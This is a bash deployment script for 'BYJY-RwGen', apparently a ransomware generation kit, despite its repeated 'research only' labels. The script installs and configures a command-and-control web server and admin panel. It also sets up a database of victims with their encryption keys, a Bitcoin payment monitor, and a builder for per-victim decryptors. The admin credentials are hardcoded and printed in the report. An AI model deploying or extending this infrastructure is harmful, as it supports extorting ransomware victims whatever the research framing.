#!/bin/bash
# BYJY-RwGen Complete System Deployment Script
# Automated deployment for defensive cybersecurity research
# FOR RESEARCH PURPOSES ONLY

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" &> /dev/null && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"
LOG_FILE="/var/log/byjy-rwgen-deploy.log"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Logging function
log() {
    local level="$1"
    shift
    local message="$*"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo -e "${timestamp} [$level] $message" | tee -a "$LOG_FILE"
}

info() { log "INFO" "$@"; }
warn() { log "WARN" "$@"; echo -e "${YELLOW}⚠ $*${NC}"; }
error() { log "ERROR" "$@"; echo -e "${RED}✗ $*${NC}"; }
success() { log "SUCCESS" "$@"; echo -e "${GREEN}✓ $*${NC}"; }

# System requirements check
check_system_requirements() {
    info "Checking system requirements..."
    
    # Check OS
    if [[ "$OSTYPE" != "linux-gnu"* ]]; then
        error "This deployment script requires Linux"
        exit 1
    fi
    
    # Check if running as root
    if [[ $EUID -eq 0 ]]; then
        warn "Running as root - this is acceptable for research deployment"
    fi
    
    # Check available disk space (minimum 2GB)
    available_space=$(df / | tail -1 | awk '{print $4}')
    if [[ $available_space -lt 2097152 ]]; then
        error "Insufficient disk space. Need at least 2GB available"
        exit 1
    fi
    
    # Check memory (minimum 2GB)
    total_memory=$(grep MemTotal /proc/meminfo | awk '{print $2}')
    if [[ $total_memory -lt 2097152 ]]; then
        warn "Low memory detected. System may run slowly"
    fi
    
    success "System requirements check passed"
}

# Install system dependencies
install_system_dependencies() {
    info "Installing system dependencies..."
    
    # Update package list
    apt-get update -y > /dev/null 2>&1
    
    # Install essential packages
    local packages=(
        "curl"
        "wget"
        "git"
        "unzip"
        "build-essential"
        "pkg-config"
        "cmake"
        "apache2"
        "php"
        "php-cli"
        "php-curl"
        "php-json"
        "php-sqlite3"
        "php-mbstring"
        "sqlite3"
        "redis-server"
        "supervisor"
        "libsodium-dev"
        "libcurl4-openssl-dev"
        "libjsoncpp-dev"
        "libssl-dev"
        "python3"
        "python3-pip"
        "python3-venv"
    )
    
    for package in "${packages[@]}"; do
        if ! dpkg -l | grep -q "^ii  $package "; then
            info "Installing $package..."
            apt-get install -y "$package" > /dev/null 2>&1
            success "$package installed"
        else
            info "$package already installed"
        fi
    done
    
    success "System dependencies installed"
}

# Setup web server
setup_web_server() {
    info "Setting up web server..."
    
    # Enable Apache modules
    a2enmod rewrite > /dev/null 2>&1
    a2enmod ssl > /dev/null 2>&1
    a2enmod headers > /dev/null 2>&1
    
    # Create virtual host
    cat > /etc/apache2/sites-available/byjy-rwgen.conf << EOF
<VirtualHost *:80>
    ServerName localhost
    DocumentRoot /var/www/html/byjy-rwgen
    
    <Directory /var/www/html/byjy-rwgen>
        Options -Indexes +FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>
    
    # API endpoints
    Alias /c2_server $PROJECT_ROOT/c2_server
    <Directory $PROJECT_ROOT/c2_server>
        Options -Indexes
        AllowOverride None
        Require all granted
        
        # Security headers
        Header always set X-Content-Type-Options nosniff
        Header always set X-Frame-Options DENY
        Header always set X-XSS-Protection "1; mode=block"
    </Directory>
    
    ErrorLog \${APACHE_LOG_DIR}/byjy-rwgen-error.log
    CustomLog \${APACHE_LOG_DIR}/byjy-rwgen-access.log combined
</VirtualHost>
EOF
    
    # Create web directory
    mkdir -p /var/www/html/byjy-rwgen
    
    # Copy admin panel files
    cp -r "$PROJECT_ROOT/c2_server/admin_panel.php" /var/www/html/byjy-rwgen/
    
    # Create index file
    cat > /var/www/html/byjy-rwgen/index.php << EOF
<?php
// Redirect to admin panel
header('Location: admin_panel.php');
exit;
?>
EOF
    
    # Set permissions
    chown -R www-data:www-data /var/www/html/byjy-rwgen
    chmod -R 755 /var/www/html/byjy-rwgen
    
    # Enable site and restart Apache
    a2ensite byjy-rwgen > /dev/null 2>&1
    systemctl restart apache2
    
    success "Web server configured"
}

# Setup database
setup_database() {
    info "Setting up database..."
    
    # Create database directory with proper permissions
    mkdir -p "$PROJECT_ROOT/c2_server/data"
    chown -R www-data:www-data "$PROJECT_ROOT/c2_server/data"
    chmod 755 "$PROJECT_ROOT/c2_server/data"
    
    # Initialize database
    cd "$PROJECT_ROOT/c2_server"
    php -f database.php > /dev/null 2>&1
    
    # Set database file permissions
    if [[ -f "$PROJECT_ROOT/c2_server/research_c2.db" ]]; then
        chown www-data:www-data "$PROJECT_ROOT/c2_server/research_c2.db"
        chmod 664 "$PROJECT_ROOT/c2_server/research_c2.db"
    fi
    
    success "Database initialized"
}

# Setup Redis cache
setup_redis() {
    info "Setting up Redis cache..."
    
    # Configure Redis
    cat > /etc/redis/redis.conf << EOF
bind 127.0.0.1
port 6379
daemonize yes
pidfile /var/run/redis/redis-server.pid
loglevel notice
logfile /var/log/redis/redis-server.log
databases 16
save 900 1
save 300 10
save 60 10000
maxmemory 256mb
maxmemory-policy allkeys-lru
EOF
    
    # Start Redis
    systemctl restart redis-server
    systemctl enable redis-server
    
    success "Redis configured and started"
}

# Setup job workers with supervisor
setup_job_workers() {
    info "Setting up background job workers..."
    
    # Create supervisor configuration
    cat > /etc/supervisor/conf.d/byjy-rwgen-worker.conf << EOF
[program:byjy-rwgen-worker]
command=php /app/c2_server/job_worker.php worker-%(process_num)s
directory=/app/c2_server
autostart=true
autorestart=true
startretries=3
user=www-data
numprocs=2
process_name=%(program_name)s_%(process_num)02d
stdout_logfile=/var/log/supervisor/byjy-worker-%(process_num)s.log
stderr_logfile=/var/log/supervisor/byjy-worker-%(process_num)s-error.log
stdout_logfile_maxbytes=10MB
stderr_logfile_maxbytes=10MB
stdout_logfile_backups=5
stderr_logfile_backups=5
EOF
    
    # Create payment monitor configuration
    cat > /etc/supervisor/conf.d/byjy-payment-monitor.conf << EOF
[program:byjy-payment-monitor]
command=php /app/c2_server/payment_monitor.php
directory=/app/c2_server
autostart=true
autorestart=true
startretries=3
user=www-data
stdout_logfile=/var/log/supervisor/byjy-payment-monitor.log
stderr_logfile=/var/log/supervisor/byjy-payment-monitor-error.log
stdout_logfile_maxbytes=10MB
stderr_logfile_maxbytes=10MB
stdout_logfile_backups=5
stderr_logfile_backups=5
EOF
    
    # Create log directories
    mkdir -p /var/log/supervisor
    chown -R www-data:www-data /var/log/supervisor
    
    # Reload supervisor
    supervisorctl reread
    supervisorctl update
    
    success "Background workers configured"
}

# Build decryption tools
build_decryption_tools() {
    info "Building decryption tools..."
    
    # Make build script executable
    chmod +x "$PROJECT_ROOT/victim_client/build_decryptor.sh"
    
    # Install dependencies for building
    "$PROJECT_ROOT/victim_client/build_decryptor.sh" deps
    
    # Create test decryptor to verify build system
    cd "$PROJECT_ROOT/victim_client"
    if ./build_decryptor.sh build test_victim_build_check "0123456789abcdef0123456789abcdef" localhost; then
        success "Decryption tools build system verified"
        
        # Clean up test files
        rm -f /tmp/decryptors/decryptor_test_victim_build_check.exe
    else
        error "Failed to build decryption tools"
        exit 1
    fi
}

# Setup monitoring and logging
setup_monitoring() {
    info "Setting up monitoring and logging..."
    
    # Create log rotation configuration
    cat > /etc/logrotate.d/byjy-rwgen << EOF
/var/log/byjy-rwgen*.log {
    daily
    rotate 7
    compress
    delaycompress
    missingok
    notifempty
    copytruncate
}

/var/log/supervisor/byjy-*.log {
    daily
    rotate 14
    compress
    delaycompress
    missingok
    notifempty
    copytruncate
}
EOF
    
    # Create health check script
    cat > /usr/local/bin/byjy-health-check.sh << 'EOF'
#!/bin/bash
# BYJY-RwGen Health Check Script

check_service() {
    local service="$1"
    if systemctl is-active --quiet "$service"; then
        echo "✓ $service is running"
        return 0
    else
        echo "✗ $service is not running"
        return 1
    fi
}

check_port() {
    local port="$1"
    local name="$2"
    if netstat -ln | grep -q ":$port "; then
        echo "✓ $name is listening on port $port"
        return 0
    else
        echo "✗ $name is not listening on port $port"
        return 1
    fi
}

echo "BYJY-RwGen System Health Check"
echo "==============================="

# Check services
check_service apache2
check_service redis-server
check_service supervisor

# Check ports
check_port 80 "Apache"
check_port 6379 "Redis"

# Check supervisor programs
echo ""
echo "Supervisor Programs:"
supervisorctl status | grep byjy

# Check disk space
echo ""
echo "Disk Usage:"
df -h / | tail -1

# Check memory
echo ""
echo "Memory Usage:"
free -h

# Check database
echo ""
echo "Database Check:"
if [[ -f "/app/c2_server/research_c2.db" ]]; then
    echo "✓ Database file exists"
    sqlite3 /app/c2_server/research_c2.db "SELECT COUNT(*) as victim_count FROM victims;" 2>/dev/null && echo "✓ Database is accessible" || echo "✗ Database access failed"
else
    echo "✗ Database file not found"
fi
EOF
    
    chmod +x /usr/local/bin/byjy-health-check.sh
    
    # Create daily health check cron job
    cat > /etc/cron.d/byjy-health-check << EOF
# BYJY-RwGen daily health check
0 6 * * * root /usr/local/bin/byjy-health-check.sh >> /var/log/byjy-rwgen-health.log 2>&1
EOF
    
    success "Monitoring and logging configured"
}

# Setup security measures
setup_security() {
    info "Setting up security measures..."
    
    # Create restricted directory for sensitive files
    mkdir -p /etc/byjy-rwgen
    chmod 700 /etc/byjy-rwgen
    
    # Generate database encryption key
    openssl rand -hex 32 > /etc/byjy-rwgen/db_encryption.key
    chmod 600 /etc/byjy-rwgen/db_encryption.key
    chown www-data:www-data /etc/byjy-rwgen/db_encryption.key
    
    # Create API keys file template
    cat > /etc/byjy-rwgen/bitcoin_api_keys.json.template << EOF
{
    "blockcypher": "your_blockcypher_api_key_here",
    "blockchair": "your_blockchair_api_key_here"
}
EOF
    
    # Set up firewall rules (basic)
    if command -v ufw > /dev/null 2>&1; then
        ufw --force enable > /dev/null 2>&1
        ufw allow ssh > /dev/null 2>&1
        ufw allow 80 > /dev/null 2>&1
        ufw allow 443 > /dev/null 2>&1
        success "Firewall configured"
    else
        warn "UFW not available, skipping firewall configuration"
    fi
    
    success "Security measures implemented"
}

# Create test data
create_test_data() {
    info "Creating test data for research..."
    
    cd "$PROJECT_ROOT/c2_server"
    php -r "
        require_once 'enhanced_database.php';
        \$db = new EnhancedDatabase();
        
        // Add test victim with secure key storage
        \$test_key = '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef';
        \$victim_id = 'research_test_victim_' . time();
        
        \$db->addVictim([
            'victim_id' => \$victim_id,
            'hostname' => 'RESEARCH-TEST-VM',
            'ip_address' => '192.168.1.100',
            'os_version' => 'Windows 11 Test Environment',
            'domain' => 'RESEARCH.LOCAL',
            'cpu_count' => 4,
            'memory_gb' => 8.0,
            'disk_space_gb' => 256.0,
            'antivirus' => 'Test Defender',
            'firewall' => 'Test Firewall',
            'country' => 'US',
            'encryption_key' => \$test_key
        ]);
        
        // Store key securely
        \$db->storeEncryptionKeySecure(\$victim_id, \$test_key);
        
        echo 'Test victim created: ' . \$victim_id . PHP_EOL;
    " > /tmp/test_victim_output.txt
    
    local test_victim_id=$(cat /tmp/test_victim_output.txt | grep "Test victim created:" | cut -d' ' -f4)
    success "Test victim created: $test_victim_id"
    
    rm -f /tmp/test_victim_output.txt
}

# Final system validation
validate_deployment() {
    info "Validating deployment..."
    
    local errors=0
    
    # Check web server
    if curl -s -o /dev/null -w "%{http_code}" http://localhost/admin_panel.php | grep -q "200"; then
        success "Web interface accessible"
    else
        error "Web interface not accessible"
        ((errors++))
    fi
    
    # Check database
    if [[ -f "$PROJECT_ROOT/c2_server/research_c2.db" ]]; then
        success "Database file exists"
    else
        error "Database file not found"
        ((errors++))
    fi
    
    # Check Redis
    if redis-cli ping | grep -q "PONG"; then
        success "Redis is responding"
    else
        error "Redis is not responding"
        ((errors++))
    fi
    
    # Check supervisor programs
    local worker_count=$(supervisorctl status | grep byjy | grep RUNNING | wc -l)
    if [[ $worker_count -ge 2 ]]; then
        success "$worker_count background workers running"
    else
        error "Background workers not running properly"
        ((errors++))
    fi
    
    # Run comprehensive test
    if [[ -f "$PROJECT_ROOT/decryption_system_test.py" ]]; then
        info "Running comprehensive system test..."
        cd "$PROJECT_ROOT"
        if python3 decryption_system_test.py > /tmp/system_test.log 2>&1; then
            success "System test passed"
        else
            warn "System test had issues (check /tmp/system_test.log)"
            cat /tmp/system_test.log
        fi
    fi
    
    if [[ $errors -eq 0 ]]; then
        success "Deployment validation passed!"
        return 0
    else
        error "Deployment validation failed with $errors errors"
        return 1
    fi
}

# Generate deployment report
generate_deployment_report() {
    info "Generating deployment report..."
    
    local report_file="/var/log/byjy-rwgen-deployment-report.txt"
    
    cat > "$report_file" << EOF
BYJY-RwGen Deployment Report
============================
Deployment Date: $(date)
System: $(uname -a)

URLS AND ACCESS:
- Web Interface: http://localhost/admin_panel.php
- API Base URL: http://localhost/c2_server/api/
- Default Admin Credentials: admin / research2024!

SERVICES STATUS:
$(systemctl status apache2 --no-pager -l | head -5)
$(systemctl status redis-server --no-pager -l | head -5)
$(supervisorctl status)

DIRECTORY STRUCTURE:
- Project Root: $PROJECT_ROOT
- Web Root: /var/www/html/byjy-rwgen
- Configuration: /etc/byjy-rwgen
- Logs: /var/log/supervisor/

HEALTH CHECK:
$(/usr/local/bin/byjy-health-check.sh)

SECURITY NOTES:
- Database encryption key: /etc/byjy-rwgen/db_encryption.key
- API keys template: /etc/byjy-rwgen/bitcoin_api_keys.json.template
- Firewall enabled with basic rules

IMPORTANT COMMANDS:
- Health Check: /usr/local/bin/byjy-health-check.sh
- Restart Workers: supervisorctl restart byjy-rwgen-worker:*
- View Logs: tail -f /var/log/supervisor/byjy-*.log
- System Test: cd $PROJECT_ROOT && python3 decryption_system_test.py

WARNING: This system is for academic cybersecurity research only.
Ensure proper isolation and ethical use guidelines are followed.
EOF
    
    success "Deployment report saved to: $report_file"
    
    # Display summary
    echo ""
    echo "==============================================="
    echo "🎉 BYJY-RwGen Deployment Complete!"
    echo "==============================================="
    echo ""
    echo "Web Interface: http://localhost/admin_panel.php"
    echo "Admin Login: admin / research2024!"
    echo ""
    echo "System Health: /usr/local/bin/byjy-health-check.sh"
    echo "Full Report: $report_file"
    echo ""
    echo "⚠️ FOR RESEARCH PURPOSES ONLY ⚠️"
    echo "Ensure proper isolation and ethical use"
    echo ""
}

# Main deployment function
main() {
    echo "BYJY-RwGen Complete System Deployment"
    echo "====================================="
    echo "FOR DEFENSIVE CYBERSECURITY RESEARCH ONLY"
    echo ""
    
    # Create log file
    touch "$LOG_FILE"
    chmod 644 "$LOG_FILE"
    
    info "Starting deployment process..."
    
    # Run deployment steps
    check_system_requirements
    install_system_dependencies
    setup_web_server
    setup_database
    setup_redis
    setup_job_workers
    build_decryption_tools
    setup_monitoring
    setup_security
    create_test_data
    
    # Validate deployment
    if validate_deployment; then
        generate_deployment_report
        exit 0
    else
        error "Deployment validation failed!"
        exit 1
    fi
}

# Handle command line arguments
case "${1:-deploy}" in
    "deploy")
        main
        ;;
    "health")
        /usr/local/bin/byjy-health-check.sh
        ;;
    "status")
        supervisorctl status | grep byjy
        systemctl status apache2 --no-pager -l | head -3
        systemctl status redis-server --no-pager -l | head -3
        ;;
    "test")
        cd "$PROJECT_ROOT" && python3 decryption_system_test.py
        ;;
    "--help"|"help")
        echo "BYJY-RwGen Deployment Script"
        echo ""
        echo "Usage: $0 [command]"
        echo ""
        echo "Commands:"
        echo "  deploy  - Full system deployment (default)"
        echo "  health  - Run health check"
        echo "  status  - Show service status"
        echo "  test    - Run system test"
        echo "  help    - Show this help"
        echo ""
        ;;
    *)
        echo "Unknown command: $1"
        echo "Use '$0 help' for usage information"
        exit 1
        ;;
esac